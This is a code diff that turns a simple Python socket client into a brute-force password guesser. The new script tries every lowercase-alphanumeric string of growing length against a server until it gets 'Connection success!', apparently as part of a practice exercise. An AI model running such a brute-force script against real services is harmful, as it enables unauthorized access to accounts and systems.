@@ -1,19 +1,31 @@
 import sys
 import socket
-import re
+from itertools import product
+
 
 def main():
-    _, ip, port, msg = sys.argv
+    _, ip, port = sys.argv
+    chars = list(range(97, 123)) + list(range(48, 58))
+    chars = [chr(i) for i in chars]
 
-    client_socket = socket.socket()  # creating the socket
+    def bruteforce(charset, length):
+        return (''.join(i) for i in product(chars, repeat=length))
 
-    client_socket.connect((ip, int(port)))  # Connect to the server
-    client_socket.send(msg.encode())  # sending data converting to bytes through socket
+    length = 0
+    with socket.socket() as s:
+        s.connect((ip, int(port)))
 
-    response = client_socket.recv(1024).decode()  # decoding received response from bytes to string
+        while True:
+            length += 1
+            for attempt in bruteforce(chars, length):
+                s.send(attempt.encode())
+                response = s.recv(1024).decode()
 
-    print(response)
-    client_socket.close()  # Close the connection
+                if response == "Connection success!":
+                    print(attempt)
+                    return
+                elif response == "Too many attempts":
+                    return
 
 
 if __name__ == '__main__':
